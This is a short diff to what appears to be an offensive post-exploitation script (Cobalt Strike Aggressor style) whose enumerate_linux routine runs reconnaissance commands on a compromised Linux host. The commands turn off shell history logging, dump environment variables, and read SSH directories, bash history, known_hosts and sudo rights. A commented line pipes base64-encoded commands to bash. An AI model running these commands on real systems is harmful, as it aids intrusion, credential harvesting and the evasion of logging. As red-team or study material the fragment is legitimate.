@@ -155,7 +155,7 @@ sub enumerate_linux {
     local('$commands');
     local('$encoded');
 
-    $commands = "unset HISTFILE HISTFILESIZE HISTSIZE;hostname;w;uname -a;date;date -u;cat /etc/*-release;env;lastlog 2>/dev/null;ls -al /home ~ ~/.ssh /tmp /dev/shm;df -h;mount;sudo -l;cat ~/.bash_history ~/.known_hosts /etc/hosts /etc/resolv.conf;ifconfig -a; ps aux; netstat -pantl";
+    $commands = " unset HISTFILE HISTFILESIZE HISTSIZE;hostname;w;uname -a;date;date -u;cat /etc/*-release;env;lastlog 2>/dev/null;ls -al /home ~ ~/.ssh /tmp /dev/shm;df -h;mount;sudo -l;cat ~/.bash_history ~/.known_hosts /etc/hosts /etc/resolv.conf;ifconfig -a; ps aux; netstat -pantl";
 
     #$encoded = "echo " . base64_encode($commands) . "|base64 -d|bash";
     #bpinut($1, "\c0Executing the following commands: " . $commands);
